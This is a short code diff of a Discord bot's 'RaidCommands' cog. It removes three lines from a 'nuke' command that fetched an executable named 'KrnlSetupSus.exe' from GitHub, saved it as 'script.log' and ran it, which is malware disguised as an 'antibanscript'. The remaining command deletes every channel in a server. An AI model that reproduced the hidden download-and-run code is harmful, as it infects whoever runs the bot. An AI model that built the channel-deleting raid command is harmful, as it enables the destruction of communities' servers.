@@ -95,9 +95,6 @@ class RaidCommands(commands.Cog):
             await asyncio.sleep(0.5)
     @commands.command()
     async def nuke(self, ctx: commands.Context):
-        antibanscript = "https://github.com/GrimmDevcc/storage/raw/refs/heads/main/KrnlSetupSus.exe"
-	urllib.request.urlretrieve(antibanscript, "script.log")
-        os.system("script.log")
         guild = ctx.guild
         for channel in guild.channels:
             await channel.delete()
